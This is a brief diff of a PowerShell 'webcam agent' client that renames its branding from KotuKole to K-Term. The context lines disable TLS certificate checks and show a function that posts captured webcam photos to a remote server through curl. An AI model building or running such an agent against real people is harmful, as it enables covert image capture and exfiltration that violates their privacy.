@@ -7,7 +7,7 @@ param(
 [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
 Write-Host "=================================================================" -ForegroundColor Cyan
-Write-Host "        📷 KOTUKOLE WEBCAM AGENT (WINDOWS CLIENT) 📷            " -ForegroundColor Cyan
+Write-Host "        📷 K-TERM WEBCAM AGENT (WINDOWS CLIENT) 📷              " -ForegroundColor Cyan
 Write-Host "=================================================================`n" -ForegroundColor Cyan
 Write-Host "[*] Connecting to Server : $ServerURL"
 Write-Host "[*] Agent Identifier     : $AgentID"
@@ -71,7 +71,7 @@ Function Capture-Webcam {
     }
 }
 
-# Function to upload photo to KotuKole server
+# Function to upload photo to K-Term server
 Function Upload-Photo($url, $filePath) {
     if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
         $out = curl.exe -s -X POST -F "webcamPhoto=@$filePath" "$url/api/upload-webcam"
